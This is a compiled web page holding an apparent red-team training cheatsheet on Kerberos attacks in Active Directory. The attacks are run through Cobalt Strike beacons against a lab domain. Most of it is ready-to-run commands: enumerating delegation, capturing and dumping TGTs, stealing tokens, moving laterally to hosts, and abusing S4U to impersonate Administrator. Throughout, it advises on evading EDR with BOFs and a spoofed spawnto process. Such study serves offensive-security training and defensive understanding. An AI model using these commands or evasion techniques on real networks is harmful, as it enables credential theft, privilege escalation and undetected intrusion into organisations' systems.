import{_ as t,o as a,c as s,am as o}from"./chunks/framework.yj4qiWdr.js";const u=JSON.parse('{"title":"Cheatsheet: Kerberos","description":"","frontmatter":{"pageClass":"crto-page","prev":false,"next":false},"headers":[],"relativePath":"crto/liham/cheatsheets/kerberos.md","filePath":"crto/liham/cheatsheets/kerberos.md"}'),i={name:"crto/liham/cheatsheets/kerberos.md"};function n(c,e,l,r,d,p){return a(),s("div",null,e[0]||(e[0]=[o(`<h1 id="cheatsheet-kerberos" tabindex="-1">Cheatsheet: Kerberos <a class="header-anchor" href="#cheatsheet-kerberos" aria-label="Permalink to &quot;Cheatsheet: Kerberos&quot;">​</a></h1><ul><li>Unconstrained Delegation</li><li>Constrained Delegation</li><li>Service Name Substitution</li><li>S4u2self Computer Takeover</li><li>Resource-Based Constrained Delegation</li><li>Lateral Movement Services</li></ul><hr><h2 id="unconstrained-delegation" tabindex="-1">Unconstrained Delegation <a class="header-anchor" href="#unconstrained-delegation" aria-label="Permalink to &quot;Unconstrained Delegation&quot;">​</a></h2><blockquote><p>Enumeration:</p></blockquote><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>ldapsearch (&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname</span></span></code></pre></div><blockquote><p>Rubeus monitor capture TGT:</p></blockquote><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe monitor /nowrap</span></span></code></pre></div><blockquote><p>Steel token of user on the compromised attacker machine using Cobalt Strike menu:</p></blockquote><blockquote><p>Open Gobalt Strike &gt; Right Click beacon &gt; Explorer &gt; Process List &gt; Sort processess &gt; click on user token whom to steal &gt; Click Steal Token.</p></blockquote><blockquote><p>Jump to target with unconstrained delegation — preferred order:</p></blockquote><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span># OPSEC-SAFE (preferred) — WinRM, no service modification, no disk write</span></span>
<span class="line"><span>jump winrm64 lon-ws-1 smb</span></span>
<span class="line"><span></span></span>
<span class="line"><span># OPSEC-CAUTION (fallback) — SCShell, modifies existing service ImagePath via SCM</span></span>
<span class="line"><span># Generates: Event 7040 (service config changed), 4697, 4688, SCM RPC events</span></span>
<span class="line"><span># Use only if WinRM is unavailable or blocked</span></span>
<span class="line"><span>jump scshell64 lon-ws-1 smb</span></span></code></pre></div><blockquote><p>Now interact with new beacon from the web server.</p></blockquote><hr><h3 id="fork-run-—-why-to-avoid-it-and-what-to-use-instead" tabindex="-1">Fork &amp; Run — Why to Avoid It and What to Use Instead <a class="header-anchor" href="#fork-run-—-why-to-avoid-it-and-what-to-use-instead" aria-label="Permalink to &quot;Fork &amp; Run — Why to Avoid It and What to Use Instead&quot;">​</a></h3><p><strong>What fork &amp; run does:</strong> CS post-ex commands (<code>execute-assembly</code>, <code>powerpick</code>, <code>mimikatz</code>, etc.) default to spawning a sacrificial child process (<code>spawnto</code> binary), injecting a reflective DLL into it, running the payload, then killing the child.</p><p><strong>Why EDR fires on it:</strong></p><ul><li>Beacon parent (<code>dllhost.exe</code>) spawning <code>rundll32.exe</code> with no arguments = anomalous parent–child process creation</li><li>Child process memory is <code>RWX</code> with no backing disk image = in-memory injection IOC</li><li>EDR hooks <code>NtCreateProcess</code>, <code>VirtualAllocEx</code>, <code>CreateRemoteThread</code> at syscall level — all triggered by fork &amp; run</li></ul><p><strong>Preferred execution model — BOF (<code>inline-execute</code>):</strong></p><ul><li>Runs position-independent C code directly inside the beacon thread</li><li>No child process spawn, no cross-process injection, no <code>RWX</code> in another process</li><li>Completely invisible to parent–child process telemetry</li></ul><table tabindex="0"><thead><tr><th>Command</th><th>Execution model</th><th>Process spawn</th><th>EDR risk</th></tr></thead><tbody><tr><td><code>inline-execute</code> / BOF</td><td>In beacon thread</td><td>None</td><td>Low</td></tr><tr><td><code>krb_triage</code> / <code>krb_dump</code></td><td>BOF</td><td>None</td><td>Low</td></tr><tr><td><code>execute-assembly</code></td><td>Fork &amp; run → spawnto</td><td>Yes</td><td>Medium (mitigated by spawnto)</td></tr><tr><td><code>powerpick</code></td><td>Fork &amp; run → spawnto</td><td>Yes</td><td>Medium</td></tr><tr><td><code>shell</code> / <code>run</code> / <code>powershell</code></td><td>Spawns cmd/powershell as child</td><td>Yes</td><td>High — avoid</td></tr></tbody></table><p><strong>Mitigate fork &amp; run when unavoidable:</strong> Set <code>spawnto</code> in your malleable profile to a plausible signed host process:</p><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>post-ex { set spawnto_x64 &quot;%windir%\\\\sysnative\\\\dllhost.exe&quot;; }</span></span></code></pre></div><p>Or per-beacon at runtime:</p><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>spawnto x64 %windir%\\sysnative\\dllhost.exe</span></span></code></pre></div><p>This changes <em>what</em> is spawned but does not eliminate the injection telemetry — BOF is always preferred.</p><hr><blockquote><p>Get the ticket for user on the web server <code>dyork</code> — BOF only, no fork &amp; run:</p></blockquote><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>krb_triage</span></span>
<span class="line"><span></span></span>
<span class="line"><span>krb_dump /luid:148e2b /service:krbtgt</span></span></code></pre></div><blockquote><p><code>OPSEC-CAUTION</code> — <code>krb_dump</code> uses <code>LsaCallAuthenticationPackage</code> (Kerberos API). Not a raw LSASS memory read, but EDR hooks on this API will still see the call. BOF means no child process at least.</p></blockquote><blockquote><p>Inject ticket directly — no disk write:</p></blockquote><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>make_token CONTOSO\\dyork FakePass!</span></span>
<span class="line"><span>kerberos_ticket_use &lt;base64-ticket&gt;</span></span></code></pre></div><blockquote><p><code>OPSEC-SAFE</code> — <code>kerberos_ticket_use</code> injects the ticket into the current beacon logon session in-memory. No file written to disk. No child process.</p></blockquote><p>Now we have admin access on the web server by abusing unconstrained delegation on member web server in domain, stealing local admin account and gaining local admin access.</p><hr><h2 id="safe-remote-command-execution-—-avoiding-av-edr" tabindex="-1">Safe Remote Command Execution — Avoiding AV/EDR <a class="header-anchor" href="#safe-remote-command-execution-—-avoiding-av-edr" aria-label="Permalink to &quot;Safe Remote Command Execution — Avoiding AV/EDR&quot;">​</a></h2><p>Use when you need host recon output from a beacon without triggering process-based detections.</p><h3 id="tier-1-—-opsec-safe-bof-runs-in-beacon-thread-no-child-process" tabindex="-1">Tier 1 — <code>OPSEC-SAFE</code>: BOF (runs in beacon thread, no child process) <a class="header-anchor" href="#tier-1-—-opsec-safe-bof-runs-in-beacon-thread-no-child-process" aria-label="Permalink to &quot;Tier 1 — \`OPSEC-SAFE\`: BOF (runs in beacon thread, no child process)&quot;">​</a></h3><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>inline-execute sysinfo.o</span></span></code></pre></div><p>No <code>systeminfo.exe</code> spawned, no child process, runs inside the beacon thread. Preferred when a sysinfo BOF is loaded on the team server.</p><hr><h3 id="tier-2-—-opsec-caution-powerpick-wmi-fork-run-no-powershell-exe" tabindex="-1">Tier 2 — <code>OPSEC-CAUTION</code>: <code>powerpick</code> + WMI (fork &amp; run, no powershell.exe) <a class="header-anchor" href="#tier-2-—-opsec-caution-powerpick-wmi-fork-run-no-powershell-exe" aria-label="Permalink to &quot;Tier 2 — \`OPSEC-CAUTION\`: \`powerpick\` + WMI (fork &amp; run, no powershell.exe)&quot;">​</a></h3><p>Gathers identical data to <code>systeminfo</code> without executing the <code>systeminfo.exe</code> binary. Fork &amp; run into <code>spawnto</code> process — ensure <code>spawnto</code> is set to <code>dllhost.exe</code> first.</p><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>powerpick Get-WmiObject Win32_OperatingSystem | Select Caption,Version,OSArchitecture,CSName</span></span>
<span class="line"><span>powerpick Get-WmiObject Win32_ComputerSystem | Select Domain,TotalPhysicalMemory,Manufacturer,Model</span></span>
<span class="line"><span>powerpick Get-WmiObject Win32_NetworkAdapterConfiguration -Filter &quot;IPEnabled=True&quot; | Select IPAddress,DefaultIPGateway,DNSServerSearchOrder</span></span></code></pre></div><hr><h3 id="tier-3-—-opsec-caution-run-direct-createprocess-no-cmd-exe-wrapper" tabindex="-1">Tier 3 — <code>OPSEC-CAUTION</code>: <code>run</code> (direct CreateProcess, no cmd.exe wrapper) <a class="header-anchor" href="#tier-3-—-opsec-caution-run-direct-createprocess-no-cmd-exe-wrapper" aria-label="Permalink to &quot;Tier 3 — \`OPSEC-CAUTION\`: \`run\` (direct CreateProcess, no cmd.exe wrapper)&quot;">​</a></h3><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>run systeminfo</span></span></code></pre></div><p>Spawns <code>systeminfo.exe</code> directly via <code>CreateProcess</code> — no <code>cmd.exe</code> intermediate. <code>systeminfo.exe</code> is a well-known recon binary with behavioural signatures; prefer Tier 1 or 2.</p><hr><h3 id="what-not-to-do" tabindex="-1">What NOT to Do <a class="header-anchor" href="#what-not-to-do" aria-label="Permalink to &quot;What NOT to Do&quot;">​</a></h3><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>shell systeminfo      ← OPSEC-UNSAFE: beacon → cmd.exe → systeminfo.exe</span></span>
<span class="line"><span>powershell systeminfo ← OPSEC-UNSAFE: spawns powershell.exe</span></span></code></pre></div><table tabindex="0"><thead><tr><th>Method</th><th>Binary spawned</th><th>Child process</th><th>EDR risk</th></tr></thead><tbody><tr><td><code>inline-execute sysinfo.o</code></td><td>None</td><td>None</td><td>Low</td></tr><tr><td><code>powerpick</code> + WMI</td><td>spawnto (<code>dllhost.exe</code>)</td><td>Yes</td><td>Medium</td></tr><tr><td><code>run systeminfo</code></td><td><code>systeminfo.exe</code></td><td>Yes</td><td>Medium-High</td></tr><tr><td><code>shell systeminfo</code></td><td><code>cmd.exe</code> + <code>systeminfo.exe</code></td><td>Yes</td><td>High — avoid</td></tr></tbody></table><hr><h2 id="constrained-delegation" tabindex="-1">Constrained Delegation <a class="header-anchor" href="#constrained-delegation" aria-label="Permalink to &quot;Constrained Delegation&quot;">​</a></h2><p>Constrained delegation restricts which back-end services a principal is permitted to delegate to — unlike unconstrained delegation, the user&#39;s TGT is never forwarded. Instead the delegating service uses two Kerberos extensions:</p><ul><li><strong>S4U2Self</strong> — the service requests a service ticket to <em>itself</em> on behalf of any user, without that user&#39;s TGT or password</li><li><strong>S4U2Proxy</strong> — the service uses that ticket to request a service ticket for the configured back-end target (<code>msDS-AllowedToDelegateTo</code>)</li></ul><p>When the <strong><code>TRUSTED_TO_AUTH_FOR_DELEGATION</code></strong> flag is set (protocol transition enabled), the service can impersonate <em>any</em> user — including Domain Admins — to the delegated service, regardless of whether that user has ever authenticated. This makes it a powerful lateral movement primitive: compromise the delegating machine, obtain its TGT, and you can access the back-end service as Administrator.</p><hr><h3 id="enumeration" tabindex="-1">Enumeration <a class="header-anchor" href="#enumeration" aria-label="Permalink to &quot;Enumeration&quot;">​</a></h3><p>Single LDAP query returns the delegating account, its allowed targets, and the UAC flag in one call:</p><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>ldapsearch (&amp;(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl</span></span></code></pre></div><blockquote><p><code>OPSEC-SAFE</code> — BOF, runs in beacon thread, no child process.</p></blockquote><p>Decode the <code>userAccountControl</code> value to confirm <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code> is set.<br> Run this on the attacker CS client (local PowerShell — not via beacon):</p><div class="language-powershell vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">powershell</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#8B949E;"># Replace 16781312 with the actual userAccountControl value returned above</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">[</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF7B72;">Convert</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">]::ToBoolean(</span><span style="--shiki-light:#005CC5;--shiki-dark:#79C0FF;">16781312</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF7B72;"> -band</span><span style="--shiki-light:#005CC5;--shiki-dark:#79C0FF;"> 16777216</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">)</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#8B949E;"># True = protocol transition enabled</span></span></code></pre></div><p>⚠️ <code>16781312</code> = <code>WORKSTATION_TRUST_ACCOUNT (0x1000)</code> + <code>TRUSTED_TO_AUTH_FOR_DELEGATION (0x1000000)</code>. If result is <code>True</code>, S4U2Self abuse is possible.</p><hr><h3 id="exploitation" tabindex="-1">Exploitation <a class="header-anchor" href="#exploitation" aria-label="Permalink to &quot;Exploitation&quot;">​</a></h3><h4 id="step-1-—-move-laterally-to-the-delegating-host-lon-ws-1" tabindex="-1">Step 1 — Move laterally to the delegating host (<em>lon-ws-1</em>) <a class="header-anchor" href="#step-1-—-move-laterally-to-the-delegating-host-lon-ws-1" aria-label="Permalink to &quot;Step 1 — Move laterally to the delegating host (*lon-ws-1*)&quot;">​</a></h4><p>⚠️ steps to <a href="./../labs/User-Impersonation-lab">lateral movement - impersonate user</a></p><h4 id="step-2-—-dump-the-machine-tgt-via-bof" tabindex="-1">Step 2 — Dump the machine TGT via BOF <a class="header-anchor" href="#step-2-—-dump-the-machine-tgt-via-bof" aria-label="Permalink to &quot;Step 2 — Dump the machine TGT via BOF&quot;">​</a></h4><p>LUID <code>0x3e7</code> is the machine account logon session (always present on domain-joined hosts):</p><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>krb_dump /luid:3e7 /service:krbtgt</span></span></code></pre></div><blockquote><p><code>OPSEC-CAUTION</code> — BOF (no child process). Uses <code>LsaCallAuthenticationPackage</code> Kerberos API — EDR hooks on this call will fire, but no raw LSASS memory read.</p></blockquote><h4 id="step-3-—-perform-s4u-abuse-via-bof-to-obtain-a-service-ticket" tabindex="-1">Step 3 — Perform S4U abuse via BOF to obtain a service ticket <a class="header-anchor" href="#step-3-—-perform-s4u-abuse-via-bof-to-obtain-a-service-ticket" aria-label="Permalink to &quot;Step 3 — Perform S4U abuse via BOF to obtain a service ticket&quot;">​</a></h4><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>krb_s4u /ticket:[base64-TGT] /service:cifs/lon-fs-1 /impersonateuser:Administrator</span></span></code></pre></div><blockquote><p><code>OPSEC-SAFE</code> — <code>krb_s4u</code> is a BOF. Runs entirely in the beacon thread. No process spawn, no disk write. Preferred over <code>execute-assembly Rubeus.exe s4u</code> which is fork &amp; run.</p></blockquote><p>Optionally inspect the resulting ticket:</p><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>krb_describe /ticket:[base64-service-ticket]</span></span></code></pre></div><blockquote><p><code>OPSEC-SAFE</code> — BOF, read-only ticket inspection.</p></blockquote><h4 id="step-4-—-inject-the-service-ticket-and-access-the-target" tabindex="-1">Step 4 — Inject the service ticket and access the target <a class="header-anchor" href="#step-4-—-inject-the-service-ticket-and-access-the-target" aria-label="Permalink to &quot;Step 4 — Inject the service ticket and access the target&quot;">​</a></h4><p>All steps on the attacker CS client / beacon — <code>.kirbi</code> written to attacker desktop only, never to target disk:</p><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>make_token CONTOSO\\Administrator FakePass!</span></span></code></pre></div><p>On attacker CS client (local PowerShell):</p><div class="language-powershell vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">powershell</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">[</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF7B72;">IO.File</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">]::WriteAllBytes(</span><span style="--shiki-light:#032F62;--shiki-dark:#A5D6FF;">&quot;C:\\Users\\Attacker\\Desktop\\cifs-lon-fs-1.kirbi&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF7B72;">,</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;"> [</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF7B72;">Convert</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">]::FromBase64String(</span><span style="--shiki-light:#032F62;--shiki-dark:#A5D6FF;">&quot;[B64_SERVICE_TICKET]&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">))</span></span></code></pre></div><p>Back in beacon:</p><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>kerberos_ticket_use C:\\Users\\Attacker\\Desktop\\cifs-lon-fs-1.kirbi</span></span>
<span class="line"><span>ls \\\\lon-fs-1\\c$</span></span></code></pre></div><blockquote><p><code>OPSEC-SAFE</code> — <code>kerberos_ticket_use</code> injects in-memory into the beacon&#39;s logon session. File path is on the attacker machine, not the target — nothing written to the target&#39;s disk.</p></blockquote><p>Drop impersonation when done:</p><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>rev2self</span></span></code></pre></div><hr><h3 id="⚠️-do-not-use-—-fork-run-s4u" tabindex="-1">⚠️ Do Not Use — Fork &amp; Run S4U <a class="header-anchor" href="#⚠️-do-not-use-—-fork-run-s4u" aria-label="Permalink to &quot;⚠️ Do Not Use — Fork &amp; Run S4U&quot;">​</a></h3><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>execute-assembly Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:[TGT] /impersonateuser:Administrator /nowrap</span></span></code></pre></div><blockquote><p><code>OPSEC-CAUTION</code> — fork &amp; run, spawns sacrificial <code>spawnto</code> process. Use <code>krb_s4u</code> BOF instead. Only fall back to this if the BOF is unavailable on the team server.</p></blockquote><h2 id="" tabindex="-1"><a class="header-anchor" href="#" aria-label="Permalink to &quot;&quot;">​</a></h2>`,94)]))}const b=t(i,[["render",n]]);export{u as __pageData,b as default};
